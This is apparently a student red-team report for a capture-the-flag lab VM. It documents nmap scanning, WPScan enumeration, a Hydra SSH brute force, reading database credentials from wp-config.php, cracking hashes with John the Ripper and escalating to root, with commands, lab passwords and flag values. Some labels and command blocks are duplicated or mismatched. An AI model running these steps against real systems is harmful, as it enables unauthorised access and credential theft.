# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

command: $ nmap -sV 192.168.1.110

output:

This scan identifies the services below as potential points of entry:
- Target 1
  Port 22/TCP Open SSH
  Port 80/TCP Open HTTP
  Port 111/TCP Open rcpbid
  Port 139/TCP Open netbios-ssn
  Port 445/TCP Open netbios-ssn

 Critical Vulnerabilites
The following vulnerabilities were identified on each target:

-Target 1
  User Enumeration (WordPress site)
  Found the occurrence of simplistic usernames and weak passwords (Hydra Command)
  Brute forced ssh to gain access into the system.
  Secure files are not hidden away.
  Misconfiguration of User Privileges/ Privilege Escalation
 

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}


 

    - **Exploit Used**
•	WPScan to enumerate users on the Target1 WordPress site.
•	Command: $ wpscan --url 192.168.1.110/wordpress $ wpscan --url 192.168.1.110 --enumerate -u
 
•	Targeting the user michael
•	Small manual Brute Force attack to guess/finds Michael's password.
•	First, the user's password is weak and obvious.
•	Second, for practice, Hydra can be used to crack Michaels's password:
o	Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh  
•	Capturing Flag1: SSH in as Michael, transvering through directories and files.
•	The first Flag was found in /var/www/html folder at root in services.html in a HTML comment below the footer.
o	Commands:
	ssh michael@192.168.1.110
	password: michael
	cd /var/www/html
	ls -l
	nano services.html





 - `flag2.txt`: {fc3fd5Bdcdad9ab23facac6e9a365e581c33}

 

    - **Exploit Used**

  The same exploit used to gain flag1.
    
  •	Capturing Flag2: While in SSH in as Michael, Flag2 was also gained.
o	Once again, browsing through the files and directories, Flag2 can be found in /var/www next to the html folder where Flag1 was found.
o	Commands:
	ssh michael@192.168.1.110
	password: michael
	cd /var/www
	ls 
	cat flag2.txt


- `flag3.txt`: {afc01ab56b50591e7dccf93122770cd23}


 

Exploit Used:

•	Same exploits to gain Flag1 and Flag2.
•	Capturing Flag3: Access the MYSQL database.
o	Discovering the wp-config.php and gaining access to the database credentials as the user Michael, MYSQL when used to explore the database.
•	Commands:
o	mysql -u root -p 
o	Enter password: R@v3nSecurity
o	show databases;
o	Show tables
o	select * from wp_posts;

 

- `flag3.txt`: {715dea6c055b9fe3337544932F2941ce}

 

Exploit Used:

•	Unsalted password hash and use of the privilege escalation with Python.
•	Capture Flag4: Gained user credentials, cracked password with John the Ripper and used Python to gain root privileges.
•	Once gaining access to the database credentials as the user Michael from the wp-config.php file, the next step was to lift the username and password hasses using MYSQL.
•	The credentials were located in the wp_users table in the wordpress database. The usernames and passwords were copied and saved on the Kali machine in a file call wp_hashes.txt.
o	Commands:
o	mysql -u root -p 
o	Enter password: R@v3nSecurity
o	show databases;
o	Show tables
o	select * from wp_posts;
•	On the Kali machine the wp_hashes.txt ran against John the Ripper to crack the hashes.
•	Command: - john wp_hashes.txt

 

•	Once the user Steven's password hash was cracked, the next step was to SSH into the server as Steven. Under the user Steven, privileges will first be checked, and escalated to root by guessing common root passwords.
o	Commands:
	ssh steven@192.168.1.110
	password: pink:84
	sudo -l
	su root
	password: toor
	find /-iname flag*
	cat /root/flag4.txt

 
